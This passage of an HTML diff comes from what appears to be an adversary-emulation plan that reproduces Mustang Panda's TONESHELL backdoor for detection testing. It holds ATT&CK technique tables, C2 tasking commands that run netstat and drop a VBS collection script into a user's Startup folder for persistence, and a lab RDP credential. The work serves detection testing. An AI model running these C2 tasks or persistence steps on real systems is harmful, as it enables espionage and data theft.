+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1082</td>
+<td>System Information Discovery</td>
+<td>Windows</td>
+<td>waitfor.exe discovers computer name via GetComputerNameA</td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL discovers computer name via GetComputerNameA</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/shellcode/shellcode_util.cpp#L320-L344">GetHostname</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1106</td>
+<td>Native API</td>
+<td>Windows</td>
+<td>waitfor.exe creates a victim ID using the hostname and volume serial number.</td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL creates a victim ID using the hostname and volume serial number.</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/shellcode/shellcode_util_id_p.cpp#L7-L45">GenerateNewVictimID</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1095</td>
+<td>Non-Application Layer Protocol</td>
+<td>Windows</td>
+<td>waitfor.exe connects to <code v-pre>191.44.44.199</code>over TCP port 443</td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL connects to <code v-pre>191.44.44.199</code>over TCP port 443</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/shellcode/comms.cpp#L114-L153">PerformHandshake</a>, <a href="../../resources/toneshell/src/shellcode/comms.cpp#L59-L85">connectSocket</a>, <a href="../../resources/toneshell/src/shellcode/cmakelists.txt#L68-L69">Set server and port at build time</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html" class="outbound" target="_blank"><span>20</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>T1106</td>
+<td>Native API</td>
+<td>Windows</td>
+<td>waitfor.exe uses ws2_32 <code v-pre>send</code> API to connect to C2</td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL uses ws2_32 <code v-pre>send</code> API to connect to C2</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/shellcode/comms.cpp#L17-L36">sendClientMsg</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html" class="outbound" target="_blank"><span>20</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-2---discovery-and-persistence">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---discovery-and-persistence">#</doc-anchor-trigger>
+        <span>Step 2 - Discovery and Persistence</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-1">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>After establishing C2, Mustang Panda discovers an active connection to the file server
+<code v-pre>redfort (10.26.3.105)</code>. Mustang Panda then downloads a VBS script to the startup
+folder for persistent collection. When the legitimate user logs back in, the VBS
+script executes several RAR commands to archive files on the file server.</p>
+<doc-anchor-target id="procedures-2">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-2">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Task TONESHELL to execute <code v-pre>netstat</code> to discover the file server <code v-pre>10.26.3.105 (redfort)</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 70d6b5c1105063b81d9ce95866793488 '{&quot;id&quot;: 5, &quot;taskNum&quot;: 1, &quot;args&quot;: &quot;netstat -anop tcp&quot;}'</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">[TASK] 2025/07/30 20:31:55
+Active Connections
+Proto Local Address Foreign Address State PID
+TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 400
+TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4
+TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 1096</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Task TONESHELL to download a file extension list used by the VBS collection
+script to the startup folder</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 70d6b5c1105063b81d9ce95866793488 '{&quot;id&quot;: 3, &quot;taskNum&quot;: 2, &quot;payload&quot;: &quot;files.txt&quot;, &quot;args&quot;: &quot;C:\\Windows\\Help\\en-US\\0.txt&quot;}'</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">File downloaded successfully</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Task TONESHELL to download the VBS collection script to the startup folder</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 70d6b5c1105063b81d9ce95866793488 '{&quot;id&quot;: 3, &quot;taskNum&quot;: 3, &quot;payload&quot;: &quot;collection.vbs&quot;, &quot;args&quot;: &quot;C:\\Users\\btully\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autoruns.vbs&quot;}'</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">File downloaded successfully</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p>Switch to the RDP to the workstation <code v-pre>bitterbridge (10.26.4.103)</code> and log out</p>
+</li>
+<li><p>From the jumpbox, initiate an RDP session to log back in to the workstation
+<code v-pre>bitterbridge (10.26.4.103)</code>. Wait until a CMD prompt appears with <code v-pre>GFlagEditor</code>
+in the window name then open File Explorer to bypass the sandbox check.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bitterbridge.vale.net</td>
+<td>btully</td>
+<td>Finished-Debug</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-1">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Discovery</td>
+<td>T1049</td>
+<td>System Network Connections Discovery</td>
+<td>Windows</td>
+<td>waitfor.exe executes <code v-pre>netstat -anop tcp</code></td>
+<td>Calibrated - Not Benign</td>
+<td>TONESHELL executes <code v-pre>netstat -anop tcp</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/shellcode/exec.cpp#L152-L239">PerformExecTask</a></td>
+<td><a href="https://www.security.com/threat-intelligence/china-southeast-asia-espionage" class="outbound" target="_blank"><span>16</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html" class="outbound" target="_blank"><span>17</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html" class="outbound" target="_blank"><span>23</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>Windows</td>
+<td>waitfor.exe downloads a VBS collection script to <code v-pre>C:\\Users\\btully\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autoruns.vbs</code></td>
+<td>Calibrated - Not Benign</td>
+<td>TONESHELL downloads a VBS collection script to <code v-pre>C:\\Users\\btully\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autoruns.vbs</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/shellcode/exec.cpp#L241-L346">PerformFileDownloadTask</a></td>
+<td><a href="https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/" class="outbound" target="_blank"><span>25</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>T1547.001</td>
+<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</td>
+<td>Windows</td>
+<td>cscript.exe executed <code v-pre>autoruns.vbs</code> from the startup folder on user login</td>
+<td>Calibrated - Not Benign</td>
+<td>VBS collection script <code v-pre>autoruns.vbs</code> is executed from the startup folder on user login</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td>-</td>
+<td><a href="https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/" class="outbound" target="_blank"><span>25</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>T1059.005</td>
+<td>Command and Scripting Interpreter: Visual Basic</td>
+<td>Windows</td>
+<td><code v-pre>autoruns.vbs</code> executes commands</td>
+<td>Calibrated - Not Benign</td>
+<td>VBS collection script <code v-pre>autoruns.vbs</code> executes commands</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/payloads/collection.vbs">collection.vbs</a></td>
+<td><a href="https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/" class="outbound" target="_blank"><span>25</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Lateral Movement</td>
+<td>T1021.002</td>
+<td>Remote Services: SMB/Windows Admin Shares</td>
+<td>Windows</td>
+<td><code v-pre>autoruns.vbs</code> executes <code v-pre>rar.exe</code> against remote shares of the file server <code v-pre>redfort (10.26.3.105)</code></td>
+<td>Calibrated - Not Benign</td>
+<td>VBS collection script <code v-pre>autoruns.vbs</code> executes <code v-pre>rar.exe</code> against remote shares of the file server <code v-pre>redfort (10.26.3.105)</code></td>
+<td>redfort (10.26.3.105), bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/payloads/collection.vbs">collection.vbs</a></td>
+<td><a href="https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/" class="outbound" target="_blank"><span>25</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" class="outbound" target="_blank"><span>26</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Collection</td>
+<td>T1560.001</td>
+<td>Archive Collected Data: Archive via Utility</td>
+<td>Windows</td>
+<td><code v-pre>autoruns.vbs</code> executes <code v-pre>rar.exe</code> to compress the A-Z shares of the file server <code v-pre>redfort (10.26.3.105)</code></td>
+<td>Calibrated - Not Benign</td>
+<td>VBS collection script <code v-pre>autoruns.vbs</code> executes <code v-pre>rar.exe</code> to compress the A-Z shares of the file server <code v-pre>redfort (10.26.3.105)</code></td>
+<td>redfort (10.26.3.105), bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/payloads/collection.vbs">collection.vbs</a></td>
